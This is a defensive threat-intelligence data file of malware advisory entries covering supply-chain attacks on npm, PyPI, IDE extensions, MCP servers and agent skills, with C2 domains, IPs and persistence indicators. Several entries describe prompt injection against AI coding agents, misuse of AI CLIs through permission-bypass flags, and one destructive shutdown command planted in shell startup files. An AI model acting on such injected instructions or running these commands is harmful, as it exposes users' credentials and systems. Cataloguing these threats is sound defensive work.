  { id: "MAL-055", category: "MAL", severity: "BLOCK", title: "postmark-mcp BCC email harvesting (first in-the-wild malicious MCP server)", description: "postmark-mcp versions 1.0.16-1.0.18 (npm publisher phanpak) injected a silent BCC on every outbound email to phan@giftshop.club — the first confirmed malicious MCP server in production. All email content processed by AI-automated Postmark workflows (password resets, invoices, internal memos) was silently copied to the attacker. Audit for postmark-mcp versions 1.0.16-1.0.18 and rotate any Postmark API keys that may have been exposed.", tags: ["mcp-server", "email-exfiltration", "bcc-injection", "postmark", "supply-chain"] },
  { id: "MAL-056", category: "MAL", severity: "BLOCK", title: "Nx/s1ngularity AI CLI weaponization via dangerously-skip-permissions", description: "The Nx s1ngularity campaign (August 2025) injected a postinstall script (telemetry.js) that weaponized locally installed AI CLI tools (claude, gemini, amazon q) using permission-bypass flags (--dangerously-skip-permissions, --yolo, --trust-all-tools) to enumerate and exfiltrate sensitive files. Stolen credentials were triple-base64 encoded and exfiltrated to attacker GitHub repos (s1ngularity-repository-NNNN). A destructive payload also appended sudo shutdown -h 0 to ~/.bashrc and ~/.zshrc. Audit node_modules for malicious postinstall hooks invoking AI CLIs with bypass flags.", tags: ["ai-weaponization", "supply-chain", "postinstall", "nx", "s1ngularity"] },
  { id: "MAL-057", category: "MAL", severity: "BLOCK", title: "JarkaStealer AI package trojan (JAR download and credential theft)", description: "The JarkaStealer campaign distributed malicious PyPI packages (gptplus, claudeai-eng) masquerading as AI model wrappers. The packages contained Base64-encoded payloads in __init__.py that downloaded JavaUpdater.jar from GitHub to steal browser data, SSH keys, and credentials. Remove any dependency on gptplus or claudeai-eng and audit __init__.py files for obfuscated download-and-execute patterns.", tags: ["supply-chain", "pypi", "jarkastealer", "ai-toolchain"] },
  { id: "MAL-058", category: "MAL", severity: "BLOCK", title: "Langflow CVE-2026-33017 unauthenticated RCE exploit", description: "CVE-2026-33017 is a critical unauthenticated remote code execution vulnerability in Langflow <= 1.8.2. Attackers can exploit the /api/v1/build_public_tmp/{flow_id}/flow endpoint by passing arbitrary Python code in the data parameter, which is executed via unsandboxed exec(). Ensure Langflow is updated to >= 1.9.0 and monitor for unauthorized access to this endpoint.", tags: ["langflow", "rce", "cve-2026-33017"] },
  { id: "MAL-059", category: "MAL", severity: "BLOCK", title: "GlassWorm 5th Wave MCP Server Supply Chain Attack", description: "The GlassWorm 5th wave attack targets MCP servers, GitHub repos, and VSCode extensions using invisible Unicode characters to execute payloads. Remove any compromised packages like @iflow-mcp/watercrawl-watercrawl-mcp and block known C2 IPs.", tags: ["glassworm", "mcp", "supply-chain"] },
  { id: "MAL-060", category: "MAL", severity: "BLOCK", title: "Telnyx PyPI WAV Steganography Credential Stealer", description: "The telnyx PyPI package (versions 4.87.1 and 4.87.2) was compromised by TeamPCP. The malware uses WAV audio steganography to hide a second-stage binary that drops a persistent executable (msbuild.exe) on Windows or harvests credentials on Linux/macOS. Remove compromised versions immediately and rotate all credentials.", tags: ["telnyx", "steganography", "teampcp"] },
  { id: "MAL-061", category: "MAL", severity: "BLOCK", title: "NomShub cursor-tunnel sandbox escape and persistence via shell builtins", description: "NomShub (disclosed April 3, 2026) is a critical vulnerability chain in Cursor AI code editor. A malicious repository embeds indirect prompt injection to trick Cursor's AI agent into running shell builtin chains (export/cd/source/eval) that escape the workspace sandbox, overwrite ~/.zshenv for persistence, and activate cursor-tunnel for persistent remote shell access. The cursor-tunnel binary provides full shell access via spawn/fs_write RPC methods and can be hijacked via GitHub device code OAuth flow. Fixed in Cursor 3.0. Do not open untrusted repositories in Cursor with agent mode enabled. Audit ~/.zshenv for unexpected entries.", tags: ["cursor", "ide", "sandbox-escape", "persistence", "remote-tunnel", "nomshub", "prompt-injection"] },
  { id: "MAL-062", category: "MAL", severity: "BLOCK", title: "ClawHub malicious skill keylogger/Atomic Stealer payload delivery", description: "Remove the malicious skill and rotate credentials.", tags: ["malware", "clawhub", "openclaw", "keylogger", "atomic-stealer", "supply-chain", "skill-registry"] },
  { id: "MAL-063", category: "MAL", severity: "BLOCK", title: "Lazarus Group graphalgo fake-recruitment npm/PyPI RAT campaign", description: "The Lazarus Group (North Korean APT) graphalgo campaign has been active since May 2025, targeting JavaScript and Python developers via fake cryptocurrency job offers on LinkedIn, Facebook, and Reddit. Malicious npm and PyPI packages (graphalgo, graphorithm, graphstruct, graphlibcore, netstruct, graphnetworkx, terminalcolor256, bigmathutils, and others) deliver a token-authenticated RAT that periodically fetches and executes commands from C2 servers (codepool.cloud, aurevian.cloud). The campaign uses a fake company (Veltrix Capital) to lend credibility to interview tasks. Remove any of these packages immediately, rotate all credentials, and report to your security team.", tags: ["malware", "lazarus", "north-korea", "dprk", "npm", "pypi", "fake-recruitment", "rat", "supply-chain", "cryptocurrency"] },
  { id: "MAL-064", category: "MAL", severity: "BLOCK", title: "velora-dex/sdk npm Go RAT dropper (minirat via alibaba.xyz)", description: "Version 9.4.1 of @velora-dex/sdk (npm) was compromised on April 7, 2026. Three lines were injected into dist/index.js that decode a base64 payload and fetch a shell script from 89.36.224.5/troubleshoot/mac/install.sh, which downloads a compiled Go RAT (minirat, module path alibaba.xyz/minirat) and persists it via launchctl under the misleading label zsh.profiler / com.apple.Terminal.profiler. The RAT communicates with C2 servers datahub.ink, cloud-sync.online, and byte-io.us for command execution, file exfiltration, and bidirectional file transfer. Remove @velora-dex/sdk 9.4.1 immediately, rotate all credentials, and check for the profiler binary in ~/Library/Application Support/com.apple.Terminal/.", tags: ["malware", "npm", "supply-chain", "rat", "go-rat", "minirat", "velora-dex", "macos", "launchctl"] },
  { id: "MAL-065", category: "MAL", severity: "BLOCK", title: "hermes-px PyPI AI conversation stealer (prompt exfiltration via Supabase)", description: "hermes-px is a malicious PyPI package (JFrog XRAY-961094, discovered April 5, 2026) that masquerades as a \"Secure AI Inference Proxy with Tor routing.\" Instead of routing through Tor, it proxies all requests through a hijacked Tunisian university API (prod.universitecentrale.net:9443) and exfiltrates every prompt and response to a Supabase endpoint (urlvoelpilswwxkiosey.supabase.co/rest/v1/requests_log). The package also embeds a stolen 246K-character Claude Code system prompt. Remove hermes-px immediately, rotate any API keys used with it, and audit for data leakage of sensitive prompts.", tags: ["malware", "pypi", "supply-chain", "exfiltration", "prompt-theft", "ai-proxy", "supabase", "hermes-px", "jfrog"] },
  { id: "MAL-066", category: "MAL", severity: "BLOCK", title: "GlassWorm Zig dropper via fake WakaTime OpenVSX extension (specstudio/code-wakatime-activity-tracker)", description: "A new GlassWorm campaign (disclosed April 8, 2026 by Aikido Security) delivers a Zig-compiled native dropper via a fake WakaTime VS Code extension (specstudio/code-wakatime-activity-tracker) published on OpenVSX. The extension bundles win.node (PE32+ DLL) and mac.node (universal Mach-O) native Node.js addons compiled in Zig. On activation, the binary silently installs a second-stage malicious extension (floktokbok.autoimport, autoimport-2.7.9.vsix) into every IDE on the machine (VS Code, Cursor, Windsurf, VSCodium, Positron). The second-stage extension beacons to a Solana blockchain C2, exfiltrates secrets, and installs a persistent RAT. Remove specstudio/code-wakatime-activity-tracker and floktokbok.autoimport from all IDEs immediately, rotate all secrets, and check for ~/init.json and ~/node-v22 persistence artifacts.", tags: ["malware", "glassworm", "vscode-extension", "openvsx", "zig-dropper", "supply-chain", "wakatime-fake", "rat", "multi-ide"] },
  { id: "MAL-067", category: "MAL", severity: "BLOCK", title: "GlassWorm invisible Unicode PUA payload injection (eval via FE00-FE0F/E0100-E01EF encoding)", description: "GlassWorm (March 2026 wave, disclosed by Aikido Security) hides malicious payloads inside invisible Unicode PUA (Private Use Area) characters in the ranges U+FE00-U+FE0F and U+E0100-U+E01EF. The attack encodes a full JavaScript payload as invisible characters embedded in an apparently empty backtick string. At runtime, a small decoder maps each character's codepoint offset to bytes, reconstructs the payload, and passes it to eval(). The decoded payload fetches and executes a second-stage script (historically via Solana memo transactions as a C2 channel) capable of stealing tokens, credentials, and secrets. Affected ecosystems include npm packages (@aifabrix/miso-client, @iflow-mcp/watercrawl-watercrawl-mcp), VS Code extensions (quartz.quartz-markdown-editor), and 150+ GitHub repositories. Audit all dependencies for invisible Unicode characters and use tools like Aikido Safe Chain or grep for the codePointAt/FE00 decoder pattern.", tags: ["malware", "glassworm", "unicode-injection", "invisible-unicode", "pua-unicode", "supply-chain", "npm", "vscode-extension", "github", "eval-injection", "solana-c2"] },
  { id: "MAL-068", category: "MAL", severity: "BLOCK", title: "js-logger-pack npm multi-platform WebSocket stealer (postinstall C2 agent)", description: "js-logger-pack is a malicious npm package (SafeDep, April 2026) that evolved from a probe into a full-featured multi-platform infostealer over 23 versions (v1.0.0–v1.1.20, April 1–15, 2026). Its postinstall hook executes print.js, an 885 KB obfuscated esbuild bundle that: (1) installs the attacker's SSH public key (bink@DESKTOP-N8JGD6T) into ~/.ssh/authorized_keys on Linux; (2) exfiltrates Telegram Desktop tdata sessions; (3) drains credentials from 27 crypto wallets and Chromium-family browsers; (4) steals .npmrc, cloud provider tokens, and shell history; and (5) runs a native keylogger on Windows, macOS, and Linux with autostart persistence. The C2 is a live WebSocket controller at ws://195.201.194.107:8010 (api-sub.jrodacooker.dev). Remove js-logger-pack immediately, rotate all credentials, revoke SSH access, and audit ~/.ssh/authorized_keys.", tags: ["npm", "postinstall", "websocket-stealer", "ssh-backdoor", "credential-theft", "keylogger", "supply-chain"] },
  { id: "MAL-069", category: "MAL", severity: "BLOCK", title: "PHANTOMPULSE RAT via Obsidian Shell Commands plugin abuse (REF6598)", description: "PHANTOMPULSE (REF6598, Elastic Security Labs, April 14 2026) is a novel AI-assisted Windows RAT delivered via Obsidian's Shell Commands community plugin. Threat actors (posing as a VC firm) social-engineer targets on LinkedIn and Telegram into opening an attacker-controlled Obsidian vault and enabling community plugin sync. The trojanized Shell Commands plugin (data.json) executes Base64-encoded PowerShell on vault open, downloading a loader (syncobs.exe / PHANTOMPULL) from 195.3.222.251. PHANTOMPULL AES-256-CBC-decrypts and reflectively loads PHANTOMPULSE, a full-featured backdoor with blockchain-based C2 resolution via Ethereum transaction data (wallet 0xc117688c530b660e15085bF3A2B664117d8672aA on Blockscout), process injection via module stomping, keylogging, screen capture, and UAC bypass. macOS variant uses an obfuscated AppleScript dropper with Telegram fallback C2 (0x666.info). C2 panel: panel.fefea22134.net. Remove the obsidian-shellcommands plugin, revoke all credentials, and check for syncobs.exe in %TEMP%.", tags: ["obsidian", "plugin-abuse", "rat", "blockchain-c2", "social-engineering", "cross-platform", "ref6598"] },
  { id: "MAL-070", category: "MAL", severity: "BLOCK", title: "NKAbuse RAT via Hugging Face Spaces typosquat (vsccode-modetx / kagent)", description: "NKAbuse is a DDoS-focused malware and RAT variant that abuses the NKN (New Kind of Network) decentralized P2P protocol for C2 communication. In April 2026, attackers created a Hugging Face Space named vsccode-modetx (a typosquat for VS Code) hosting a dropper script (install-linux.sh) and a malware binary named kagent (mimicking a legitimate Kubernetes AI agent tool). The dropper installs the kagent binary and establishes persistence via systemd, cron, or macOS LaunchAgent. The malware functions as a RAT capable of executing shell commands with output sent back to the operator via NKN. Remove the kagent binary, check for persistence mechanisms, and block the vsccode-modetx Hugging Face Space.", tags: ["nkabuse", "hugging-face", "typosquat", "rat", "nkn", "p2p-c2"] },
  { id: "MAL-071", category: "MAL", severity: "BLOCK", title: "TradingClaw / Needle Stealer: fake TradingView AI agent site with DLL-hijacking browser takeover (April 2026)", description: "TradingClaw (tradingclaw[.]pro) is a fake TradingView AI agent site discovered by Malwarebytes in April 2026. Visitors are tricked into downloading a ZIP containing a DLL-hijacking loader (iviewers.dll) that injects Needle Stealer into RegAsm.exe via process hollowing. Needle Stealer is a modular Go-based infostealer with browser credential theft, clipboard hijacking, crypto wallet spoofing (Ledger, Trezor, Exodus, MetaMask, Coinbase), and a malicious browser extension module that achieves full browser takeover (redirect, script injection, download interception, fake notifications). The extension unpacks from base.zip/meta.zip and reads cfg.json for C2 configuration. Block tradingclaw[.]pro and studypages[.]com. Remove any unknown browser extensions. Rotate all credentials and crypto wallet seeds on affected systems.", tags: ["tradingclaw", "needle-stealer", "dll-hijacking", "infostealer", "browser-takeover", "cryptostealer"] },
  { id: "MAL-072", category: "MAL", severity: "BLOCK", title: "AMOS Stealer delivered via Cursor AI agent social engineering (ClickFix / fake Claude Code troubleshooting, April 2026)", description: "On April 23, 2026, Field Effect MDR detected AMOS Stealer (Atomic macOS Stealer) delivered via a novel attack vector: social engineering of a Cursor AI agent running Claude Code. A ClickFix-style fake Claude Code troubleshooting page (hosted at arkypc[.]com) tricks the Cursor agent into executing curl commands to download a malicious helper binary, which runs two obfuscated AppleScripts. Script 1 performs VM/sandbox evasion (system_profiler SPHardwareDataType/SPMemoryDataType). Script 2 executes the full AMOS payload: harvests credentials, SSH keys, crypto wallets, browser data; stages to /tmp/out.zip; exfiltrates in 25 MB chunks to lakhov[.]com/contact. A persistent implant is then installed masquerading as a legitimate macOS service. Block arkypc[.]com and lakhov[.]com. Do not allow AI coding agents to execute scripts from untrusted URLs without explicit user review. Rotate all credentials on affected macOS systems.", tags: ["amos-stealer", "cursor-ai-agent", "clickfix", "claude-code", "macos", "applescript", "social-engineering"] },
  { id: "MAL-073", category: "MAL", severity: "BLOCK", title: "Mark H VS Code extension cryptojacking campaign (asdf11.xyz C2, XMRig miner, April 2026)", description: "In April 2026, a threat actor using the VS Code Marketplace publisher name \"Mark H\" published nine trojanized extensions that accumulated over 1 million combined installs in three days. Affected extensions include MarkH.discord-rich-presence-vs, MarkH.golang-compiler-vscode, MarkH.html-obfuscator-vscode, MarkH.python-obfuscator-vscode, MarkH.rust-compiler-vs, MarkH.claude-ai, and MarkH.chatgpt-agent-vscode. All extensions contact the C2 domain asdf11[.]xyz (registered April 4, 2026), execute a PowerShell loader that disables Windows Defender, drops an XMRig cryptocurrency miner payload, and creates persistence via a Windows scheduled task named \"OnedriveStartup\". Microsoft removed the extensions from the Marketplace. Uninstall all MarkH-published extensions, delete the OnedriveStartup scheduled task (schtasks /Delete /TN \"OnedriveStartup\" /F), terminate any xmrig.exe processes, and scan for persistence artifacts on affected systems.", tags: ["cryptojacking", "xmrig", "vscode-extension", "markh", "asdf11"] },
  { id: "MAL-074", category: "MAL", severity: "BLOCK", title: "GlassWorm v2 sleeper extension cluster — 73 Open VSX impersonators (April 2026)", description: "Socket Research Team (April 25, 2026) identified 73 cloned Open VSX extensions linked to GlassWorm v2. Six have been confirmed malicious (boulderzitunnel.vscode-buddies, cubedivervolt.html-code-validate, outsidestormcommand.monochromator-theme, keyacrosslaud.auto-loop-for-antigravity, krundoven.ironplc-fast-hub, winnerdomain17.version-lens-tool); the rest are high-confidence sleepers. The confirmed malicious extensions use two delivery mechanisms: (1) bundled win.node/mac.node Zig-compiled native binaries that invoke install() to fetch and install a second-stage VSIX from GitHub release repos (SquadMagistrate10/wnxtgkih, francesca898/dqwffqw); (2) obfuscated JavaScript that resolves VS Code/Cursor/Windsurf CLI paths and installs the downloaded extension. The payload VSIX SHA256 is 97c275e3406ad6576529f41604ad138c5bdc4297d195bf61b049e14f6b30adfd. Sleeper extensions follow the same publisher pattern (newly created GitHub accounts with one empty 8-char-named repo). Remove all listed extensions, audit for VSIX payloads in extension directories, and rotate credentials on affected machines.", tags: ["glassworm", "open-vsx", "sleeper-extension", "vscode", "supply-chain"] },
  { id: "MAL-075", category: "MAL", severity: "BLOCK", title: "ClawSwarm agent economy hijack: imaflytok/onlyflies.buzz silent agent registration and Hedera wallet generation (April 2026)", description: "ClawSwarm (disclosed April 29, 2026 by Manifold/Ax Sharma) is a campaign of 30 ClawHub skills published by user \"imaflytok\" with ~9,800 downloads. The skills silently register the AI agent at onlyflies.buzz, report its name and capabilities to a third-party server, generate a Hedera (HBAR) crypto wallet, store credentials on disk, and check in every four hours — all without user consent or approval. Affected skill names include cron-helper, agent-security-skill, whale-watcher, cross-platform-poster, and predictions-market-integration. Remove all skills from this author, revoke any stored credentials, and audit agent memory for onlyflies.buzz registration entries.", tags: ["clawhub", "clawswarm", "onlyflies", "hedera", "crypto-wallet", "agent-hijack"] },
  { id: "MAL-076", category: "MAL", severity: "BLOCK", title: "OpenClaw/ClawHub malicious skills campaign (hightower6eu/sakaen736jih, April 2026)", description: "Acronis TRU identified a large-scale malware distribution campaign in ClawHub (April 2026) with over 575 malicious skills, primarily uploaded by actors \"hightower6eu\" and \"sakaen736jih\". The trojanized skills use indirect prompt injection or social engineering (e.g., \"README BEFORE INSTALLING.txt\") to trick users into downloading password-protected archives (like ClawHub-DependencyInstaller.zip) or executing encoded commands. Payloads include the AMOS Stealer for macOS (downloaded from 91.92.242.30) and cryptominers for Windows (communicating with velvet-parrot.com). Do not install OpenClaw skills that require external unverified dependencies.", tags: ["malware", "openclaw", "clawhub", "amos-stealer", "cryptominer"] },
  { id: "MAL-077", category: "MAL", severity: "BLOCK", title: "Hugging Face malware staging (ITHKRPAW / FAKESECURITY, April 2026)", description: "Threat actors are increasingly abusing Hugging Face repositories to host malware payloads and stage multistep infection chains. The ITHKRPAW campaign uses Cloudflare Workers to deploy a PowerShell script that drops \"omni-agent-v4.exe\" (disguised as microsoft-update-assist.exe) from a Hugging Face dataset. The FAKESECURITY campaign uses obfuscated batch scripts (e.g., vZJY8wQTBDxEtilj.bat) downloaded from a Hugging Face repository (owned by 2i7j732ddi) to perform in-memory process injection into explorer.exe. Treat Hugging Face models and datasets as untrusted inputs and avoid executing unverified binaries.", tags: ["malware", "huggingface", "dropper", "process-injection"] },
  { id: "MAL-078", category: "MAL", severity: "BLOCK", title: "Mini Shai-Hulud Bun Runtime Loader (bun-v1.3.13, TeamPCP)", description: "Malicious loader pattern for the Mini Shai-Hulud worm (TeamPCP). Compromised packages (lightning 2.6.2/2.6.3, SAP CAP npm @cap-js/* 2.2.2, intercom-client 7.0.4/7.0.5) download the Bun JavaScript runtime at exactly bun-v1.3.13 from GitHub to execute an obfuscated credential-harvesting payload. Uninstall affected packages, upgrade to clean versions, and rotate all API keys, cloud credentials, SSH keys, and GitHub tokens. Audit git history for unexpected commits with author \"claude <claude@users.noreply.github.com>\".", tags: ["mini-shai-hulud", "teampcp", "bun-runtime", "credential-stealer"] },
  { id: "MAL-079", category: "MAL", severity: "BLOCK", title: "Mini Shai-Hulud IDE persistence hook via folderOpen or SessionStart (TeamPCP)", description: "The Mini Shai-Hulud worm (TeamPCP) propagates by committing malicious IDE configuration files into every accessible repository. On VS Code it commits .vscode/tasks.json with \"runOn\":\"folderOpen\" that silently executes node .claude/setup.mjs when the repo is opened. On Claude Code it commits .claude/settings.json with a SessionStart hook that executes node .vscode/setup.mjs. Anyone opening the infected repository re-executes the credential-harvesting payload without installing any package. Audit repositories for unexpected .claude/settings.json and .vscode/tasks.json files committed by \"claude <claude@users.noreply.github.com>\".", tags: ["mini-shai-hulud", "teampcp", "persistence", "ide-hook"] },
  { id: "MAL-080", category: "MAL", severity: "BLOCK", title: "QLNX (Quasar Linux) PAM backdoor and developer credential harvester targeting supply chain", description: "QLNX (Quasar Linux) is a sophisticated Linux RAT targeting developer and DevOps workstations to enable downstream supply chain attacks via stolen npm/PyPI registry credentials. It deploys a malicious PAM module via LD_PRELOAD that intercepts plaintext passwords at authentication time, XOR-encrypting and caching them to /var/log/.ICE-unix. A compile-on-target design ships embedded C PAM backdoor source that builds a host-architecture-matched shared library, bypassing signature-based detection. A dual-layer rootkit (userland LD_PRELOAD + kernel-level eBPF) hides files, processes, PIDs, and network ports. The credential harvester systematically extracts secrets from .npmrc, .pypirc, .git-credentials, .aws/credentials, .kube/config, .docker/config.json, .vault-token, and .env, then exfiltrates them to the C2 over TLS. A 58-command RAT framework maintains persistent C2 access. Distinctive indicators: hardcoded master PAM password O$$f$QtYJK; credential cache at /var/log/.ICE-unix; lock file /tmp/.X752e2ca1-lock (DJB2 hash of string \"quasar_linux\" = 0x752e2ca1). Sweep for LD_PRELOAD entries referencing unexpected .so files, suspicious gcc/cc compilation of embedded C source, and the lock file path. Source: Trend Micro (May 2026).", tags: ["qlnx", "quasar-linux", "pam-backdoor", "supply-chain", "credential-theft"] },
  { id: "MAL-081", category: "MAL", severity: "BLOCK", title: "Mini Shai-Hulud wave-3 (TeamPCP) supply-chain attack on @mistralai/@tanstack npm packages via CI/CD cache poisoning (CVE-2026-45321, GHSA-g7cv-rxg3-hmpx)", description: "CVE-2026-45321 (CVSS 9.6 CRITICAL, GHSA-g7cv-rxg3-hmpx) is a supply-chain compromise affecting the @tanstack npm namespace (42 packages, 84 malicious versions published 2026-05-11 19:20-19:26 UTC) and @mistralai/mistralai 2.2.2-2.2.4, @mistralai/mistralai-azure 1.7.1-1.7.3, @mistralai/mistralai-gcp 1.7.1-1.7.3 (GHSA-3q49-cfcf-g5fm / MAL-2026-3432). Threat actor TeamPCP exploited a pull_request_target Pwn Request misconfiguration in the TanStack CI/CD pipeline to poison GitHub Actions build caches and extract an OIDC token from runner process memory via /proc/<pid>/mem, then used that token to publish malicious package versions through the legitimate release workflow — producing the first known supply-chain artifacts carrying valid SLSA provenance. The injected payload installs a preinstall hook that downloads Bun and executes a ~2.3 MB obfuscated payload. On victim developer machines, a persistent gh-token-monitor daemon (macOS LaunchAgent / Linux systemd) polls GitHub every 60 seconds for new tokens. Stolen credentials are exfiltrated via three redundant channels: the typosquat C2 domain git-tanstack.com (also hosts the transformers.pyz secondary payload), the Session messenger file-upload network (filev2.getsession.org, seed1-3.getsession.org), and GitHub API dead drops. Mutex: /tmp/tmp.ts018051808.lock. Malicious package versions have been yanked; update all @tanstack/* and @mistralai/* packages to clean post-incident releases and sweep developer machines for ~/.claude/setup.mjs, ~/.vscode/setup.mjs, gh-token-monitor service entries, and /tmp/transformers.pyz.", tags: ["mini-shai-hulud", "teampcp", "supply-chain", "mistralai", "tanstack", "cve-2026-45321", "ghsa-g7cv-rxg3-hmpx", "ghsa-3q49-cfcf-g5fm"] },
  { id: "MAL-082", category: "MAL", severity: "BLOCK", title: "SmartLoader/StealC MCP-fake-repo campaign — Polygon blockchain dead-drop C2 (polygon.drpc.org eth_call) + LuaJIT lua51.dll loader", description: "SmartLoader is a LuaJIT-based infostealer loader distributed (as of April 2026) via 109+ fake GitHub repositories that clone legitimate MCP server projects — including Oura Ring MCP (oura-mcp). Each malicious ZIP contains a one-line batch launcher, a renamed LuaJIT 2.1 binary, lua51.dll, and an obfuscated Lua payload disguised as a .txt or .log file. SmartLoader uses a Polygon smart contract via JSON-RPC eth_call to polygon.drpc.org as a dead-drop resolver to obtain the current C2 URL, then downloads and reflectively executes a StealC infostealer PE. Persistence is via two scheduled tasks under %LOCALAPPDATA% that masquerade as audio manager or Office components. Never run LuaJIT binaries obtained from unverified MCP server repositories. Audit %LOCALAPPDATA% for unexpected lua51.dll and LuaJIT executables. Active campaign — 109 repos across 103 GitHub accounts confirmed by Hexastrike/GBHackers (April 2026).", tags: ["smartloader", "stealc", "luajit", "blockchain-c2", "polygon", "oura-mcp"] },
  { id: "MAL-083", category: "MAL", severity: "BLOCK", title: "PromptMink DPRK crypto credential stealer via trojanized npm/PyPI packages (@validate-sdk/v2, scraper-npm, C2 ipfs-url-validator.vercel.app)", description: "PromptMink is a multi-stage credential-stealing malware campaign attributed to Famous Chollima (North Korea). The npm package @validate-sdk/v2 is the primary payload — it masquerades as a data validation library but exfiltrates crypto wallet config, SSH keys, and cloud credentials to ipfs-url-validator.vercel.app/fetchbs58 via a Base64-encoded C2 URL. The first-stage bait package @solana-launchpad/sdk silently installs @validate-sdk/v2 as a transitive dependency. The PyPI port scraper-npm reimplements the same stealer in Python and adds SSH-key persistence. ReversingLabs tracked 60+ packages and 300+ versions across October 2025–April 2026 (disclosure date April 29, 2026). Remove @validate-sdk/v2, @solana-launchpad/sdk, and scraper-npm immediately; rotate all credentials and crypto wallets accessible from the affected machine.", tags: ["promptmink", "famous-chollima", "dprk", "npm", "pypi", "crypto-stealer"] },
  { id: "MAL-084", category: "MAL", severity: "BLOCK", title: "Mini Shai-Hulud wave-4 (TeamPCP) @antv npm ecosystem compromise via maintainer account takeover (echarts-for-react@3.2.7, t.m-kosche.com C2, May 19 2026)", description: "On May 19 2026 (01:56–02:18 UTC) the npm maintainer account atool was compromised and 637 malicious versions were published across 317 packages in the @antv ecosystem and adjacent packages (size-sensor, echarts-for-react, timeago.js, jest-canvas-mock, jest-date-mock) in a 22-minute automated burst. The payload is a 498 KB obfuscated Bun bundle (index.js) delivered as a preinstall hook. It harvests GitHub PATs, AWS credentials (env, config, EC2 IMDS, ECS metadata, Secrets Manager), Kubernetes service account tokens, HashiCorp Vault tokens, npm access tokens, SSH keys, and 1Password/Bitwarden/pass vault data, then exfiltrates to t.m-kosche.com:443 and the Session P2P network (filev2.getsession.org). A Python backdoor (cat.py) provides persistent remote access. GitHub removed 640 malicious packages and invalidated 61,274 npm granular access tokens. Upgrade echarts-for-react past 3.2.7; pin @antv/* to a clean post-incident release. Attribution — TeamPCP (same operators as waves 1–3).", tags: ["mini-shai-hulud", "teampcp", "supply-chain", "antv", "npm", "credential-stealer"] },
  { id: "MAL-085", category: "MAL", severity: "BLOCK", title: "Mini Shai-Hulud wave-4 (TeamPCP) Nx Console VS Code extension supply chain compromise (nrwl.angular-console v18.95.0, May 18 2026)", description: "On May 18 2026 (12:30–12:48 UTC) the nrwl.angular-console VS Code extension (Nx Console, v18.95.0) was published to the Visual Studio Marketplace with a malicious payload active for 18 minutes. The compromised release silently fetched and executed a 498 KB obfuscated payload hidden in a dangling orphan commit inside the official nrwl/nx GitHub repository. The payload harvests GitHub tokens, npm access tokens, AWS credentials (env + IMDS + Secrets Manager), HashiCorp Vault tokens, Kubernetes service account tokens, 1Password vault data, and ~/.claude/settings.json (AI coding assistant credentials). Stolen data is exfiltrated via three channels — HTTPS, GitHub API dead-drops, and DNS tunneling. A Python backdoor (cat.py) signed with an attacker RSA-4096 key and using the GitHub Search API as a command dead-drop provides persistent access. The root cause was a developer machine infected by @tanstack/zod-adapter@1.166.15 (TeamPCP wave-3, May 11) seven days earlier, demonstrating worm-to-extension supply chain propagation. Impact — approximately 3,800 GitHub internal repositories exfiltrated. Uninstall nrwl.angular-console v18.95.0 immediately; the extension auto-updated past this version if it was live and auto-update was enabled. Rotate all GitHub tokens, npm tokens, AWS keys, and AI tool credentials on any affected machine. Attribution — TeamPCP.", tags: ["mini-shai-hulud", "teampcp", "supply-chain", "vscode-extension", "nx-console", "credential-stealer"] },
  { id: "MAL-086", category: "MAL", severity: "BLOCK", title: "TrapDoor multi-ecosystem supply-chain credential stealer targeting crypto/AI-dev toolchains (npm/PyPI/crates.io, CLAUDE.md/.cursorrules zero-width poisoning, May 2026)", description: "TrapDoor is a multi-ecosystem supply-chain campaign (first observed May 22 2026) deploying 34 malicious packages and 384+ artifact versions across npm (21 packages), PyPI (7 packages), and Crates.io (6 packages). Named packages include token-usage-tracker, wallet-security-checker, defi-env-auditor, prompt-engineering-toolkit, llm-context-compressor (npm); cryptowallet-safety, defi-risk-scanner, eth-security-auditor (PyPI); sui-move-build-helper, move-compiler-tools (Crates.io). The npm payload is a 1,149-line credential harvester (trap-core.js) executed via postinstall hook. It steals SSH keys, Sui/Solana/Aptos wallet keystores, AWS credentials, GitHub tokens, browser profile data, crypto wallet extension data, environment variables, and API keys. A distinctive AI-developer targeting feature: the payload writes hidden zero-width Unicode prompt-injection instructions into .cursorrules and CLAUDE.md files in the project root, tricking AI coding assistants (Cursor, Claude Code) into running what appears to be a routine project security scan but is actually credential exfiltration. Crates.io packages use XOR encryption with hardcoded key cargo-build-helper-2026. Payload delivery via ddjidd564.github.io. Campaign marker P-2024-001. Remove all listed packages immediately, audit .cursorrules and CLAUDE.md for zero-width Unicode (U+200B–U+200D, U+FEFF, U+00AD), and rotate all secrets on affected developer machines.", tags: ["trapdoor", "supply-chain", "npm", "pypi", "crates", "credential-stealer", "ai-config-poisoning"] },
  { id: "MAL-087", category: "MAL", severity: "BLOCK", title: "Malware-Slop: mouse5212-super-formatter npm infostealer targeting Claude AI /mnt/user-data directory (May 2026)", description: "mouse5212-super-formatter is a malicious npm package (all versions) discovered May 27 2026 by OX Security, codenamed Malware-Slop. Its postinstall script masquerades as an \"archive deployment sync\" utility that validates or initializes a GitHub repository and syncs local workspace files. In reality it authenticates to GitHub using either a GITHUB_TOKEN environment variable found on the victim machine or a hard-coded attacker fallback token, creates a repository under the threat actor GitHub account (mouse5212), and then recursively uploads every file under /mnt/user-data — the dedicated directory used by Anthropic Claude AI for uploads, outputs, and project files — to that remote repository. Approximately 676 downloads recorded before removal. Notably the package contained the attacker own hard-coded GitHub private token which was leaked, allowing researchers to trace the exfiltration chain; the token has been invalidated by GitHub. The threat actor likely used AI to generate the malware code without adequate OPSEC review. Remove mouse5212-super-formatter from all projects immediately and rotate any GITHUB_TOKEN or other credentials present in the execution environment. Audit /mnt/user-data for sensitive files that may have been exfiltrated.", tags: ["malware-slop", "claude-ai-target", "npm", "credential-stealer", "infostealer"] },
